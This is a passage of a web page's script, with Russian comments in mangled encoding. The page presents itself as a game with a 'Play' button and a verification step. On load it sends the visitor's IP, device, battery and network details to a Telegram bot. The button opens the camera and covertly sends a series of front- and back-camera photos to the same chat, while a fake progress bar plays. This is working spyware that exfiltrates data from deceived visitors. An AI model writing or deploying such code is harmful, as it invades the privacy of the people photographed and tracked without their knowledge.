                    if (permissionsResult.ok) {

                        info += `‚úÖ –ú–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: ${permissionsResult.result.can_send_messages ? '–î–∞' : '–ù–µ—Ç'}\n`;
                        info += `‚úÖ –ú–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –º–µ–¥–∏–∞: ${permissionsResult.result.can_send_media_messages ? '–î–∞' : '–ù–µ—Ç'}\n`;

        // –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? '–î–∞' : '–ù–µ—Ç',
                        chargingTime: battery.chargingTime ? battery.chargingTime + ' —Å–µ–∫' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' —Å–µ–∫' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                    };
                } catch (e) {
                    return { error: '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –æ –±–∞—Ç–∞—Ä–µ–µ' };
                }
            }
            return { error: 'API –±–∞—Ç–∞—Ä–µ–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è' };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
        function getConnectionInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    return {
                        type: connection.type || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        effectiveType: connection.effectiveType || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        downlink: connection.downlink + ' Mbps',
                        rtt: connection.rtt + ' –º—Å',
                        saveData: connection.saveData ? '–î–∞' : '–ù–µ—Ç'
                    };
                }
            }
            return { error: '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞' };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        function getDeviceInfo() {
            const screen = window.screen;
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                cookieEnabled: navigator.cookieEnabled ? '–î–∞' : '–ù–µ—Ç',
                doNotTrack: navigator.doNotTrack || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                hardwareConcurrency: navigator.hardwareConcurrency || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                maxTouchPoints: navigator.maxTouchPoints || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth + ' –±–∏—Ç',
                    pixelDepth: screen.pixelDepth + ' –±–∏—Ç',
                    orientation: screen.orientation ? screen.orientation.type : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toString(),
                localTime: new Date().toLocaleString(),
                timezoneOffset: new Date().getTimezoneOffset() + ' –º–∏–Ω—É—Ç'
            };

            return deviceInfo;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ —á–∏—Ç–∞–µ–º—ã–π –≤–∏–¥
        function formatInfo(info) {
            let result = '';
            for (const [key, value] of Object.entries(info)) {
                if (typeof value === 'object' && value !== null) {
                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
                } else {
                    result += `${key}: ${value}\n`;
                }
            }
            return result;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞
        function startProgressBar() {
            loadingContainer.style.display = 'block';
            let progress = 0;
            const interval = 40; // 40 —Å–µ–∫—É–Ω–¥ = 40000 –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥
            const step = 100 / (interval * 10); // 10 –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –≤ —Å–µ–∫—É–Ω–¥—É
            
            const timer = setInterval(() => {
                progress += step;
                progressBar.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(timer);
                    messageBox.style.display = 'block';
                    setTimeout(() => {
                        progressBar.style.width = '0%';
                    }, 1000);
                }
            }, 100);
        }

        // –£–ù–ò–í–ï–†–°–ê–õ–¨–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –í TELEGRAM
        async function sendToTelegram(endpoint, data) {
            try {
                let url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
                console.log(`Sending to Telegram: ${endpoint}`);
                
                let options = {};
                
                if (data instanceof FormData) {
                    // –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ (multipart/form-data)
                    options = {
                        method: 'POST',
                        body: data
                    };
                } else {
                    // –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π (application/json)
                    options = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    };
                }
                
                const response = await fetch(url, options);
                const result = await response.json();
                
                console.log(`Telegram response for ${endpoint}:`, result);
                
                if (!result.ok) {
                    throw new Error(result.description || 'Unknown Telegram error');
                }
                
                return result;
            } catch (error) {
                console.error(`Telegram API error (${endpoint}):`, error);
                throw error;
            }
        }

        // 1. –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function sendUserInfo() {
            try {
                console.log('Starting user info collection...');
                
                // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
                let ip = 'Unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (ipResponse.ok) {
                        const ipData = await ipResponse.json();
                        ip = ipData.ip;
                    }
                } catch (ipError) {
                    console.warn('Could not get IP:', ipError);
                }

                // –ü–æ–ª—É—á–∞–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const [batteryInfo, connectionInfo] = await Promise.all([
                    getBatteryInfo().catch(e => ({ error: e.message })),
                    getConnectionInfo()
                ]);

                const deviceInfo = getDeviceInfo();

                // –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ—Ä–æ—Ç–∫–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è —Ç–µ—Å—Ç–∞
                let message = `üÜï –ù–û–í–´–ô –í–ò–ó–ò–¢\n\n`;
                message += `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.platform}\n`;
                message += `üåê IP: ${ip}\n`;
                message += `üïí –í—Ä–µ–º—è: ${new Date().toLocaleString()}\n`;
                message += `üîã –ë–∞—Ç–∞—Ä–µ—è: ${batteryInfo.level || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                message += `üì∂ –°–µ—Ç—å: ${connectionInfo.effectiveType || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
                console.log('Sending user info to Telegram...');
                await sendToTelegram('sendMessage', {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                });
                
                console.log('User info sent successfully!');

            } catch (error) {
                console.error('Error sending user info:', error);
                
                // Fallback: –ø—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –º–∏–Ω–∏–º–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                try {
                    let fallbackMessage = `‚ö†Ô∏è TEST MESSAGE\n`;
                    fallbackMessage += `–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n`;
                    fallbackMessage += `–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç —Å–∞–π—Ç–∞`;
                    
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: fallbackMessage,
                        parse_mode: 'HTML'
                    });
                } catch (fallbackError) {
                    console.error('Fallback also failed:', fallbackError);
                }
            }
        }

        // 2. –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
        async function captureAndSendPhoto(index) {
            try {
                console.log(`Capturing photo ${index}...`);
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth || 320;
                canvas.height = videoElement.videoHeight || 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.5);
                });
                
                const cameraType = isFrontCameraActive ? 'front' : 'back';
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
                
                const caption = `üì∏ Photo ${index} (${cameraType})\nTime: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                console.log(`Sending photo ${index} to Telegram...`);
                await sendToTelegram('sendPhoto', formData);
                
                console.log(`Photo ${index} sent successfully!`);
                
            } catch (error) {
                console.error(`Error sending photo ${index}:`, error);
            }
        }

        // 3. –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É –∫–∞–º–µ—Ä–∞–º–∏
        async function switchCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                isFrontCameraActive = !isFrontCameraActive;
                const facingMode = isFrontCameraActive ? 'user' : 'environment';

                console.log(`Switching to ${isFrontCameraActive ? 'front' : 'back'} camera...`);
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    },
                    audio: false
                });

                videoElement.srcObject = currentStream;

                if (isFrontCameraActive) {
                    frontCameraStream = currentStream;
                } else {
                    backCameraStream = currentStream;
                }

                await new Promise(resolve => setTimeout(resolve, 300));

            } catch (error) {
                console.error('Camera switch error:', error);
                throw error;
            }
        }

        // 4. –°–µ—Ä–∏–π–Ω–∞—è —Å—ä–µ–º–∫–∞
        async function takeSeriesOfPhotos() {
            try {
                if (photoCount < totalPhotos) {
                    await captureAndSendPhoto(photoCount + 1);
                    photoCount++;
                    
                    if (photoCount < totalPhotos) {
                        await switchCamera();
                        setTimeout(takeSeriesOfPhotos, photoInterval);
                    } else {
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å—ä–µ–º–∫–∏
                        try {
                            await sendToTelegram('sendMessage', {
                                chat_id: chatId,
                                text: `‚úÖ –°–™–ï–ú–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                                parse_mode: 'HTML'
                            });
                        } catch (e) {
                            console.error('Completion message error:', e);
                        }
                        
                        stopAllCameras();
                    }
                }
                
            } catch (error) {
                console.error('Series error:', error);
                stopAllCameras();
            }
        }

        // 5. –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Å–µ—Ö –∫–∞–º–µ—Ä
        function stopAllCameras() {
            console.log('Stopping all cameras...');
            [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
                if (stream) {
                    try {
                        stream.getTracks().forEach(track => track.stop());
                    } catch (error) {
                        console.error('Error stopping camera:', error);
                    }
                }
            });
            videoElement.srcObject = null;
        }

        // 6. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä
        async function initCameras() {
            try {
                console.log('Initializing cameras...');
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–æ–Ω –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
                newBackground.style.display = 'block';
                startProgressBar();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ —Å—ä–µ–º–∫–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `üì∏ –ù–ê–ß–ê–õ–û –°–™–ï–ú–ö–ò\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Start message error:', e);
                }

                isFrontCameraActive = true;
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    },
                    audio: false
                });
                frontCameraStream = currentStream;
                videoElement.srcObject = currentStream;

                await new Promise(resolve => setTimeout(resolve, 1000));

                photoCount = 0;
                takeSeriesOfPhotos();
                
            } catch (error) {
                console.error('Camera init error:', error);
                messageBox.style.display = 'block';
            }
        }

        // 7. –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ò–≥—Ä–∞—Ç—å"
        playBtn.addEventListener('click', async function() {
            console.log('Play button clicked, starting verification...');
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `üü¢ –ö–ù–û–ü–ö–ê –ù–ê–ñ–ê–¢–ê\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Button click message error:', e);
                }
                
                // –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true
                });
                stream.getTracks().forEach(track => track.stop());
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
                await sendUserInfo();
                await initCameras();
            } catch (error) {
                console.error('User denied camera access:', error);
                messageBox.style.display = 'block';
            }
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            console.log('Page loaded, sending initial info...');
            // –°–Ω–∞—á–∞–ª–∞ —Ç–µ—Å—Ç–∏—Ä—É–µ–º API
            testTelegramAPI().then(() => {
                // –ï—Å–ª–∏ —Ç–µ—Å—Ç –ø—Ä–æ–π–¥–µ–Ω, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ
                sendUserInfo().catch(e => console.error('Initial info error:', e));
            }).catch(e => {
                console.error('API test failed:', e);
                alert('‚ùå –¢–µ—Å—Ç API –Ω–µ –ø—Ä–æ–π–¥–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞ –∏ –∫–∞–Ω–∞–ª–∞.');
            });
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            console.log('Page closing, stopping cameras...');
            stopAllCameras();
        });

        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –≤–∏–¥–∏–º–æ—Å—Ç–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('Page hidden, stopping cameras...');
                stopAllCameras();
            }
        });
    </script>
</body>
